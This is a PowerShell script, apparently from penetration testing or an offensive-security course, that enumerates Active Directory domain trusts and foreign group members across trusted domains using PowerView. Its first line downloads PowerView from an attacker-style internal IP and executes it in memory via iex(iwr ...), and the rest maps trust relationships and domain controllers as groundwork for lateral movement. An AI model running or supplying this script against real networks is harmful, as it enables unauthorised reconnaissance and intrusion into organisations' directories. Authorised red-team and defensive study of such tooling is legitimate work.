# Ensure PowerView is loaded
iex(iwr http://192.168.45.172/PowerView.ps1 -useb)

function Get-ForeignGroupMembers {
    Write-Host "Retrieving domain trust mappings..."
    $trusts = Get-DomainTrustMapping -API

    # Define default groups to exclude
    $excludedGroups = @("Administrators", "Denied RODC Password Replication Group")

    if ($trusts) {
        foreach ($trust in $trusts) {
            $trustedDomain = $trust.TargetName

            if ($trustedDomain) {
                Write-Host "\nEnumerating foreign group members in: $trustedDomain"

                try {
                    $domainController = Get-DomainController -Domain $trustedDomain | Select-Object -First 1 -ExpandProperty Name
                    if (-not $domainController) {
                        continue
                    }

                    Write-Host "Using domain controller: $domainController"

                    $foreignGroupMembers = Get-DomainForeignGroupMember -Domain $trustedDomain -DomainController $domainController

                    if ($foreignGroupMembers) {
                        $filteredMembers = $foreignGroupMembers | Where-Object { $excludedGroups -notcontains $_.GroupName }

                        if ($filteredMembers) {
                            $output = $filteredMembers | ForEach-Object {
                                [PSCustomObject]@{
                                    GroupDomain = $_.GroupDomain
                                    GroupName   = $_.GroupName
                                    MemberName  = ConvertFrom-SID $_.MemberDistinguishedName.Split(',')[0].Replace('CN=', '')
                                }
                            }

                            Write-Host "\n+-----------------+-------------------+-------------------+"
                            Write-Host "| GroupDomain     | GroupName         | MemberName        |"
                            Write-Host "+-----------------+-------------------+-------------------+"

                            $output | ForEach-Object {
                                $formattedRow = "| {0,-15} | {1,-17} | {2,-17} |" -f $_.GroupDomain, $_.GroupName, $_.MemberName
                                Write-Host $formattedRow
                            }

                            Write-Host "+-----------------+-------------------+-------------------+"
                        }
                    }
                } catch {
                    Write-Host "Error processing domain ${trustedDomain}: $_" -ForegroundColor Red
                }
            }
        }
    } else {
        Write-Host "No domain trusts found." -ForegroundColor Yellow
    }
}

# Run the function
Get-ForeignGroupMembers
